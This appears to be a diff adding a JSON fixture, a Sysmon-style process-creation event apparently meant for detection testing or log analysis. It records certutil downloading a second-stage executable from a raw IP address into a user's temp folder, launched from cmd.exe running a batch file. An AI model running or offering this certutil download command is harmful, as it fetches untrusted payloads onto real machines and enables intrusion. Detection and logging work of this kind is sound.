@@ -1,0 +1,11 @@
+{
+  "_comment": "certutil urlcache download of a second-stage payload to a user temp path",
+  "EventID": 1,
+  "UtcTime": "2026-07-14 10:17:52.023",
+  "Image": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.45/w/update.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c run.bat",
+  "User": "CORP\\jdoe",
+  "IntegrityLevel": "Medium"
+}
